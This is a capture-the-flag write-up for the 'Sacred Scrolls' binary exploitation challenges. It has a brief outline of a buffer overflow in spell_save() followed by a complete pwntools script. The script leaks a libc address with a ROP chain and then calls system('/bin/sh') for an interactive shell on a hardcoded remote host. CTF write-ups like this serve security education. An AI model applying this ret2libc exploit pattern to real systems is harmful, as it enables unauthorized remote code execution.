# Sacred Scrolls / Sacred Scrolls' Revenge (Pwn - Easy)

- `spell_save()` function is vulnerable to buffer overflow since the destination buffer is only 1 byte while the `memcpy()` is copying more than it.
- use buffer overflow to print `puts()` function address on server's `libc`
- calculate offset
- return back to main
- repeat buffer overflow but now spawn a shell

The main difference between `Sacred Scrolls` and `Sacred Scrolls' Revenge` challenge is the base64 input validation. The former one allows `+`, `/`, and `=` while the latter one only allows `[a-zA-Z0-9]`. Luckily my payload only contains alphanumeric characters to begin with. Therefore, the following python3 script works for both challenges.

```sh
$ python3 solve.py HOST=206.189.118.55 PORT=32482
```

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sacred_scrolls
from pwn import *
import os
import time

# Set up pwntools for the correct architecture
exe = context.binary = ELF("sacred_scrolls")
libc = ELF("./glibc/libc.so.6")
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


host = args.HOST or "206.189.118.55"
port = int(args.PORT or 32482)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./glibc/'


def gen_input(rop):
    with open("spell.txt", "wb") as f:
        f.write(rop.chain())

    time.sleep(1)
    os.system("rm -f spell.zip")
    os.system("zip spell.zip spell.txt")
    os.system("base64 -w 0 < spell.zip > inp")
    time.sleep(1)

    with open("inp", "rb") as f:
        inp = f.read()
    return inp


def submit_and_trigger(io, inp):
    io.sendlineafter(b"tag: ", b"1")
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"zip): ", inp)
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b">> ", b"3")


pop_rdi_ret = rop.rdi.address
puts_got = exe.got["puts"]
puts_plt = exe.plt["puts"]
main_addr = exe.symbols["main"]
puts_offset = libc.symbols["puts"]

signature = b"\xf0\x9f\x91\x93\xe2\x9a\xa1"
pad = b"A" * 33

rop.raw(signature)
rop.raw(pad)
rop.raw(pop_rdi_ret)
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(main_addr)

inp = gen_input(rop)

io = start()

submit_and_trigger(io, inp)

io.recvuntil(b"saved!\n")
#
leaked_puts = io.recvline().strip()
leaked_puts = int.from_bytes(leaked_puts, byteorder="little")
log.info(f"leaked: {hex(leaked_puts)}")

libc.address = leaked_puts - puts_offset

system_addr = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh"))

rop = ROP(exe)

rop.raw(signature)
rop.raw(pad)
rop.raw(rop.ret.address)
rop.raw(pop_rdi_ret)
rop.raw(bin_sh)
rop.raw(system_addr)

inp = gen_input(rop)

submit_and_trigger(io, inp)

io.interactive()
```
